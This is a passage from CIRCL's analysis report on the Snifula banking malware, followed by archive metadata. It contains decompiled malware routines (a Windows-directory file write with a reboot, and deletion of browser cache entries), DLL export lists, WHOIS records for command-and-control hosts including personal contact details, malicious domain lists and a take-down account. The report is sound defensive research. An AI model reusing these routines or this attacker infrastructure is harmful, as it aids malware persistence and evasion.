h I n s t a n c e, 0 x10000u, &NumberOfBytesWritten, 0 ) ;\n\n25 CloseHandle ( h F i l e W i n d o w s D i r e c t o r y ) ;\n\n26 i f ( s u c c e s s )\n\n27 reboot_windows ( v9 ) ;\n\n28 }\n\n29 windows_directory = HeapFree ( hHeap, 0, windows_directory ) ;\n\n30 }\n\n31 r e t u r n windows_directory ;\n\n32 }\n\n_2._ _Delete URL from URL Cache_\n\n1 **s i g n e d** **i n t** __stdcall delete_URL_from_UrlCache (LPCSTR URL)\n\n2 {\n\n3 HLOCAL hMem; _//_ _edi@1_\n\n4 HANDLE UrlCacheEntry ; _//_ _ebx@2_\n\n5 **s i g n e d** **i n t** r e t ; _//_ _[ sp+8h ]_ _[ bp−8h ] @1_\n\n6 DWORD c b C a c h e E n t r y I n f o ; _//_ _[ sp+Ch ]_ _[ bp−4h ] @1_\n\n7 r e t = 0 ;\n\n8 c b C a c h e E n t r y I n f o = 4096;\n\n9 hMem = L o c a l A l l o c (0 x40u, 0 x1000u ) ;\n\n10 **i f** ( hMem )\n\n11 {\n\n12 UrlCacheEntry = F i n d F i r s t U r l C a c h e E n t r y A (0, hMem, &c b C a c h e E n t r y I n f o ) ;\n\n13 **i f** ( UrlCacheEntry )\n\n21\n\n\n-----\n\n14 {\n\n15 r e t = 1 ;\n\n16 **do**\n\n17 {\n\n18 **i f** ( S t r S t r I A ( _⇤_ (hMem + 1), URL) )\n\n19 D e l e t e U r l C a c h e E n t r y ( _⇤_ (hMem + 1 ) ) ;\n\n20 c b C a c h e E n t r y I n f o = 4096;\n\n21 }\n\n22 **w h i l e** ( FindNextUrlCacheEntryA ( UrlCacheEntry, hMem, &c b C a c h e E n t r y I n f o ) ) ;\n\n23 F i n d C l o s e U r l C a c h e ( UrlCacheEntry ) ;\n\n24 }\n\n25 L o c a l F r e e (hMem ) ;\n\n26 }\n\n27 **r e t u r n** r e t ;\n\n28 }\n\n**D.** **Exports**\n\n_1._ _ctfmreg.dll_\n\nF l a g s : 00000000\n\nTime stamp : Tue Mar 13 2 0 : 3 2 : 4 6 2012\n\nV e r s i o n : 0 . 0\n\nDLL name : c l i e n t . d l l\n\nO r d i n a l s base : 1 . (00000001)\n\n# o f A d d r e s s e s : 4 6 . (0000002E)\n\n# o f Names : 4 6 . (0000002E)\n\n1 . 00011F9D C r e a t e P r o c e s s N o t i f y\n\n2 . 000054B3 RefreshAppRegEnum\n\n3 . 000028C6 D e s t r o y O v e r S t r u c t P o o l\n\n4 . 0000223A S e r v e r G e t A p p l i c a t i o n T y p e\n\n5 . 000066DC F r e e O v e r S t r u c t\n\n6 . 0000451A OpenAppRegEnum\n\n7 . 00006AA2 GetComputerObject\n\n8 . 00005D02 C a l l B e g i n n i n g\n\n9 . 00002C55 R e s e t C a l l C o u n t\n\n1 0 . 0000583B OpenComponentLibraryOnStreamEx\n\n1 1 . 000061B1 R e i n i t O v e r S t r u c t\n\n1 2 . 00001881 SetActionLogModeSz\n\n1 3 . 00006965 S e t S i l e n t\n\n1 4 . 00005A12 OpenComponentLibraryEx\n\n1 5 . 00008AC4 MonitorHandle\n\n1 6 . 00001104 OpenComponentLibraryOnMemEx\n\n1 7 . 00005DBD R e g i s t e r A p p l i c a t i o n\n\n1 8 . 000030DB GetGlobalBabyJITEnabled\n\n1 9 . 00006F0D SetUnimodemTimer\n\n2 0 . 0000125B SetActionLogMode\n\n2 1 . 000074B3 E x e c ut e Ac t io n\n\n2 2 . 00006B9B StopMonitoringHandle\n\n2 3 . 000026A4 SetSetupSave\n\n2 4 . 00008E5B AppRegEnum\n\n2 5 . 00008FC1 C r e a t e O v e r S t r u c t P o o l\n\n2 6 . 00006097 CreateUnimodemTimer\n\n2 7 . 00006B06 SetupSave\n\n2 8 . 0000435D StartMonitorThread\n\n2 9 . 00006104 DowngradeAPL\n\n3 0 . 00005BDB Q u e r y A p p l i c a t i o n\n\n3 1 . 00003991 UpdateFromAppChange\n\n3 2 . 000072BC UpdateFromComponentChange\n\n3 3 . 000055BE G e t S i m p l e T a b l e D i s p e n s e r\n\n22\n\n\n-----\n\n3 4 . 00005DB5 S y n c D e v i c e I o C o n t r o l\n\n3 5 . 00008609 U m P l a t f o r m D e i n i t i a l i z e\n\n3 6 . 0000275A CloseAppRegEnum\n\n3 7 . 000010D4 U n r e g i s t e r A p p l i c a t i o n\n\n3 8 . 00006937 StopMonitorThread\n\n3 9 . 00007D16 SetSetupOpen\n\n4 0 . 00008C1C C a l l E n d i n g\n\n4 1 . 00007551 I n p r o c S e r v e r 3 2 F r o m S t r i n g\n\n4 2 . 000062B8 CancelUnimodemTimer\n\n4 3 . 000056C4 SetActionName\n\n4 4 . 00005269 FreeUnimodemTimer\n\n4 5 . 000040E1 S e t A c t i o n L o g F i l e\n\n4 6 . 00007 E53 GetCatalogObject\n\n_2._ _dump_00E30000.bin_\n\nF l a g s : 00000000\n\nTime stamp : Tue Mar 13 2 0 : 3 2 : 4 6 2012\n\nV e r s i o n : 0 . 0\n\nDLL name : c l i e n t . d l l\n\nO r d i n a l s base : 1 . (00000001)\n\n# o f A d d r e s s e s : 1 . (00000001)\n\n# o f Names : 1 . (00000001)\n\n1 . 00001872 C r e a t e P r o c e s s N o t i f y\n\n**E.** **Involved hosts and AS numbers**\n\nwednesltr.com.tw (122.155.165.122)\n\n_•_\n\ninetnum : 122. 155. 160. 0 − 122.155.191.255\n\nnetname : CAT−IDC2−S e r v i c e\n\nd e s c r : CAT IDC2 14 th f l o o r\n\ncountry : TH\n\nadmin−c : SC1450−AP\n\ntech _−c :_ CS416−AP\n\ns t a t u s : ALLOCATED NON−PORTABLE\n\nremarks : _⇤⇤⇤_ send spam abuse to support@idc . cattelecom . com⇤⇤⇤\n\nn o t i f y : support@idc . cattelecom . com\n\nmnt−by : MAINT−TH−THIX−CAT\n\nmnt−lower : MAINT−TH−THIX−CAT\n\nmnt−r o u t e s : MAINT−TH−THIX−CAT\n\nmnt− i r t : IRT−CAT−TH\n\nchanged : suchok@cat . net . th 20110112\n\nsource : APNIC\n\nperson : support CAT IDC\n\nnic −hdl : SC1450−AP\n\ne−mail : support@idc . cattelecom . com\n\na d d re s s : CAT−IDC Data Comm. Dept . ( IDC )\n\na d d re s s : CAT Telecom P u b l i c Company Ltd,\n\na d d re s s : 72 Charoenkrung Road Bangrak Bangkok THAILAND 10501\n\na d d re s s :\n\n23\n\n\n-----\n\nphone : +66−2−6141240−3\n\nfax _−no :_ +66−2−6142270\n\ncountry : TH\n\nchanged : suchok@bulbul . cat . net . th 20070719\n\nmnt−by : MAINT−NEW\n\nsource : APNIC\n\nperson : CAT−IDC Spamming t r a c k i n g team\n\nnic −hdl : CS416−AP\n\ne−mail : abuse@idc . cattelecom . com\n\na d d re s s : I n t e r n e t data c e n t e r department CAT Tower f l o o r 13\n\n72 charenkrung Rd . Bangrak Bangkok\n\nphone : +66−210−41240\n\nfax _−no :_ +66−210−41244\n\ncountry : TH\n\nchanged : suchok@bulbul . cat . net . th 20091211\n\nmnt−by : MAINT−NEW\n\nsource : APNIC\n\nmasmitnd.com.tw (64.62.146.101)\n\n_•_\n\nNetRange : 6 4 . 6 2 . 1 2 8 . 0 − 64. 62.2 55.2 55\n\nCIDR : 64.62.128.0/17\n\nOriginAS : AS6939\n\nNetName : HURRICANE−4\n\nNetHandle : NET−64−62−128−0−1\n\nParent : NET−64−0−0−0−0\n\nNetType : D i r e c t A l l o c a t i o n\n\nComment : ADDRESSES WITHIN THIS BLOCK ARE NON−PORTABLE\n\nRegDate : 2002−08−27\n\nUpdated : 2012−02−24\n\nRef : http :// whois . a r i n . net / r e s t / net /NET−64−62−128−0−1\n\nOrgName : Hurricane E l e c t r i c, Inc .\n\nOrgId : HURC\n\nAddress : 760 Mission Court\n\nCity : Fremont\n\nStateProv : CA\n\nPostalCode : 94539\n\nCountry : US\n\nRegDate :\n\nUpdated : 2011−04−13\n\nRef : http :// whois . a r i n . net / r e s t / org /HURC\n\nR e f e r r a l S e r v e r : rwhois :// rwhois . he . net :4321\n\nOrgTechHandle : ZH17−ARIN\n\nOrgTechName : Hurricane E l e c t r i c\n\nOrgTechPhone : +1−510−580−4100\n\nOrgTechEmail : hostmaster@he . net\n\n24\n\n\n-----\n\nOrgTechRef : http :// whois . a r i n . net / r e s t /poc/ZH17−ARIN\n\nOrgAbuseHandle : ABUSE1036−ARIN\n\nOrgAbuseName : Abuse Department\n\nOrgAbusePhone : +1−510−580−4100\n\nOrgAbuseEmail : abuse@he . net\n\nOrgAbuseRef : http :// whois . a r i n . net / r e s t /poc/ABUSE1036−ARIN\n\nRTechHandle : ZH17−ARIN\n\nRTechName : Hurricane E l e c t r i c\n\nRTechPhone : +1−510−580−4100\n\nRTechEmail : hostmaster@he . net\n\nRTechRef : http :// whois . a r i n . net / r e s t /poc/ZH17−ARIN\n\nRNOCHandle : ZH17−ARIN\n\nRNOCName: Hurricane E l e c t r i c\n\nRNOCPhone : +1−510−580−4100\n\nRNOCEmail : hostmaster@he . net\n\nRNOCRef : http :// whois . a r i n . net / r e s t /poc/ZH17−ARIN\n\nRAbuseHandle : ABUSE1036−ARIN\n\nRAbuseName : Abuse Department\n\nRAbusePhone : +1−510−580−4100\n\nRAbuseEmail : abuse@he . net\n\nRAbuseRef : http :// whois . a r i n . net / r e s t /poc/ABUSE1036−ARIN\n\nfinancepfrro.com.tw (195.191.56.240)\n\n_•_\n\ninetnum : 1 9 5 . 1 9 1 . 5 6 . 0 − 195.191.57.255\n\nnetname : AltNet _−UA_\n\nd e s c r : PE Kolobov Aleksandr G r i g o r i e v i c h\n\ncountry : UA\n\nremarks : #############################################\n\nremarks : ### Points of contact f o r One Host Hosting Center\n\nremarks : ### SPAM: abuse@onehost . com . ua\n\nremarks : ### Network s e c u r i t y i s s u e s : noc@onehost . com . ua\n\nremarks : ### Customer support : support@onehost . com . ua\n\nremarks : #############################################\n\norg : ORG−IKAG2−RIPE\n\nadmin−c : VMK19−RIPE\n\ntech _−c :_ VMK19−RIPE\n\ns t a t u s : ASSIGNED PI\n\nmnt−by : RIPE−NCC−END−MNT\n\nmnt−lower : RIPE−NCC−END−MNT\n\nmnt−by : AS50395−MNT\n\nmnt−r o u t e s : AS50395−MNT\n\nmnt−domains : AS50395−MNT\n\nsource : RIPE # F i l t e r e d\n\no r g a n i s a t i o n : ORG−IKAG2−RIPE\n\norg−name : IP Kolobov Aleksandr G r i g o r i e v i c h\n\n25\n\n\n-----\n\norg−type :\n\nother a d d r e s s : 5uy K o t e l y n i c h e s k i y a l l e y 12, of . 14\n\nmnt−r e f : NETASSIST−MNT\n\nmnt−by : NETASSIST−MNT\n\nsource : RIPE # F i l t e r e d\n\nperson : V a s i l i y M Kamenskiy\n\na d d re s s : u l . P ro s p e rt Mira, 47\n\nphone : +7 495 7832213\n\nnic −hdl : VMK19−RIPE\n\nmnt−by : AS50395−MNT\n\nsource : RIPE # F i l t e r e d\n\n% I n f o r m a t i o n r e l a t e d to ’195.191.56.0/23 AS50395 ’\n\nroute : 195.191.56.0/23\n\nd e s c r : PPoE Network\n\no r i g i n : AS50395\n\nmnt−by : AS50395−MNT\n\nsource : RIPE # F i l t e r e d\n\n200.46.204.8\n\n_•_\n\ninetnum : 200.46.204.0/25\n\ns t a t u s : r e a l l o c a t e d\n\nowner : HUB.ORG\n\nownerid : PA−HUBO1−LACNIC\n\nr e s p o n s i b l e : Marc G. F o u r n i e r\n\na d d re s s : 360 Main Street, S u i t e 21, 360,\n\na d d re s s : 11111 − Panama −\n\ncountry : PA\n\nphone : +902 542 0713 [ ]\n\nowner−c : MGF\n\ntech _−c :_ MGF\n\nabuse _−c :_ MGF\n\nc r e a t e d : 20040129\n\nchanged : 20040129\n\ninetnum−up : 200.46.192/20\n\nnic −hdl : MGF\n\nperson : Marc G. F o u r n i e r\n\ne−mail : scrappy@HUB .ORG\n\na d d re s s : 360 Main Street, S u i t e 21, 360,\n\na d d re s s : B4P1C4 − W o l f v i l l e − NS\n\ncountry : CA\n\nphone : +1 902 542 0713 [ ]\n\nc r e a t e d : 20031010\n\nchanged : 20031010\n\n95.143.198.47\n\n_•_\n\n26\n\n\n-----\n\ninetnum : 9 5 . 1 4 3 . 1 9 8 . 1 − 95.143.198.254\n\nnetname : s e r v e r c o n n e c t −cloud _−network_\n\nd e s c r :\n\nAbuse−mailbox : abuse@serverconnect . se\n\ncountry : se\n\nadmin−c : PF4155−RIPE\n\ntech _−c :_ PF4155−RIPE\n\ns t a t u s : ASSIGNED PA\n\nmnt−by : MNT−SERVERCONNECT\n\nsource : RIPE # F i l t e r e d\n\nperson : Peter Forslund\n\na d d re s s : Hyggesvagen 1\n\nphone : +46 650484444\n\nnic −hdl : PF4155−RIPE\n\nsource : RIPE # F i l t e r e d\n\n% I n f o r m a t i o n r e l a t e d to ’95.143.192.0/20 AS49770 ’\n\nroute : 95.143.192.0/20\n\nd e s c r : S e rv a i n e t −BLK\n\no r i g i n : AS49770\n\nmnt−by : MNT−SERVERCONNECT\n\nsource : RIPE # F i l t e r e d\n\n**F.** **Related domain information**\n\nThese domains have been identified being registered using the same email address\n\n’aster@gmail.com’. With a high probability, these are used with malicious intention.\n\n46.102.232.171 maserluk . com . tw . TTL 600\n\n46.102.232.171 p u z i l l o . com . tw . TTL 600\n\n46.102.232.171 q u a n i t e r . com . tw . TTL 600\n\n46.102.232.171 q v a z g l a s . com . tw . TTL 600\n\n64 .62.1 46.1 00 asteronew . com . tw . TTL 600\n\n64 .62.1 46.1 01 as−forum . com . tw . TTL 600\n\n64 .62.1 46.1 01 hotmaking . com . tw . TTL 600\n\n64 .62.1 46.1 01 MASMITND.COM.TW. TTL 600\n\n66 .197. 144. 38 VKRMEK.COM.TW. TTL 600\n\n79 .137. 214. 18 ABC−FORUM.COM.TW. TTL 600\n\n79 .137. 214. 18 oberon323 . com . tw . TTL 600\n\n79 .137. 214. 18 OREON3.COM.TW. TTL 600\n\n79 .137. 214. 18 properdom . com . tw . TTL 600\n\n79 .137. 214. 18 vnuess3 . com . tw . TTL 600\n\n89 .201. 174. 51 gubkabob . com . tw . TTL 600\n\n9 1 . 2 1 1 . 8 8 . 3 9 preon . com . tw . TTL 600\n\n91 .215. 218. 79 guardalarms . com . TTL 600\n\n91 .215. 218. 79 shambabu . com . tw . TTL 600\n\n27\n\n\n-----\n\n122.155.165.122 w e d n e s l t r . com . tw . TTL 600\n\n188.247.135.77 NEWLIFEN .COM.TW. TTL 600\n\n188.247.135.77 WEHAVECHANSE.COM.TW. TTL 600\n\n194.219.29.152 metdoman . com . TTL 600\n\n195.191.56.240 f i n a n c e p f r r o . com . tw . TTL 600\n\n195.191.56.240 man−forum . com . tw . TTL 600\n\n195.191.56.240 mastermi . com . tw . TTL 600\n\n195.191.56.240 MASTERMI.COM.TW. TTL 600\n\n195.191.56.240 mas te ro fo r . com . tw . TTL 600\n\n195.191.56.240 membran . com . tw . TTL 600\n\n203.150.230.31 c l o s u r e s o c k s . com . TTL 600\n\n204.93.171.237 DIGMETACPAN.COM.TW. TTL 600\n\n204.93.171.237 newgetp . com . tw . TTL 600\n\n204.93.171.246 g o o d l o k i . com . tw . TTL 600\n\n2 1 2 . 3 6 . 9 . 5 2 apocalp . com . tw . TTL 600\n\n**G.** **Take-down**\n\nBased on a previous version of this report, CIRCL in collaboration with various registrars\n\nand/or hosters was able to take-down all the identified domains and several IP addresses. Taking\n\ndown IP addresses or the associated computers unfortunately took much more time and the\n\nprocess is now completed as with the release date of this version of the report.\n\n_1._ _Registered domains_\n\nCIRCL asked on July 27 2012 for the take-down of the ’.com.tw’ and ’.com’ domains. All\n\n’.com.tw’ domains were suspended on August 08 2012. The ’.com’ domains were suspended on\n\nAugust 16 2012\n\n_2._ _IP addresses_\n\nSeveral of the IP addresses are no longer active, for instance the two hardcoded IP addresses\n\n(200.46.204.8, 95.143.198.47), but quite a few still are or are active again. Fortunately, the\n\n**examined malware mainly relies on DNS (except for the two hardcoded IP addresses)**\n\n**and the hardcoded IP addresses are no longer reachable.**\n\n28\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://www.circl.lu/assets/files/tr-13/tr-13-snifula-analysis-report-v1.3.pdf"
    ],
    "report_names": [
        "tr-13-snifula-analysis-report-v1.3.pdf"
    ],
    "threat_actors": [
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "2f07a03f-eb1f-47c8-a8e9-a1a00f2ec253",
            "created_at": "2022-10-25T16:07:24.277669Z",
            "updated_at": "2025-03-27T02:02:10.157972Z",
            "deleted_at": null,
            "main_name": "TA428",
            "aliases": [
                "Operation LagTime IT",
                "Operation StealthyTrident",
                "ThunderCats"
            ],
            "source_name": "ETDA:TA428",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "Agent.dhwf",
                "Albaniiutas",
                "BlueTraveller",
                "Chymine",
                "Cotx RAT",
                "CoughingDown",
                "Darkmoon",
                "Destroy RAT",
                "DestroyRAT",
                "Gen:Trojan.Heur.PT",
                "Kaba",
                "Korplug",
                "LuckyBack",
                "PhantomNet",
                "PlugX",
                "Poison Ivy",
                "RedDelta",
                "RoyalRoad",
                "SManager",
                "SPIVY",
                "Sogu",
                "TIGERPLUG",
                "TManger",
                "TVT",
                "Thoper",
                "Xamtrav",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1666716494,
    "ts_updated_at": 1743041131,
    "ts_creation_date": 1369812977,
    "ts_modification_date": 1369812977,
    "files": {
        "pdf": "https://archive.orkl.eu/c89d765042bb57aae91e091c4eea7b12063929bb.pdf",
        "text": "https://archive.orkl.eu/c89d765042bb57aae91e091c4eea7b12063929bb.txt",
        "img": "https://archive.orkl.eu/c89d765042bb57aae91e091c4eea7b12063929bb.jpg"
    }
}